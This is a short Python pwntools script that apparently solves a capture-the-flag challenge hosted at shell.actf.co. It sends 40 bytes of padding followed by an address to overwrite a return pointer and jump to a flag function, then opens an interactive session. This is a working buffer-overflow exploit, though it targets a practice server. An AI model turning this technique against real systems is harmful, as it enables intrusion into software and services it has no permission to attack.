from pwn import *

offset = 40
flag = 0x00401186

r = remote("shell.actf.co", 20700)

payload = b"A" * offset
payload += p64(flag)

r.sendline(payload)

r.interactive()
